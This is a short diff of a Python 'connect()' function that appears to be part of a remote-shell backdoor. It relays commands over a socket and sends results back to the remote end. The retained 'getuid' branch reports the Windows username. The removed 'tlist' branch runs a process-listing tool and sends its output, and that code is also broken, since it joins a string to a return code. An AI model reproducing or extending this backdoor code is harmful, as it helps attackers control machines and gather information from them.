@@ -74,10 +74,6 @@ def connect():
         
         elif 'getuid' in command:
         		s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
-        
-        elif 'tlist' in command:
-        		file = 'C:\\Program Files\\Debugging Tools for Windows\\tlist.exe'
-        		s.send( "[+] UserID Is " + subprocess.call([file]))
         	
         	
         else:
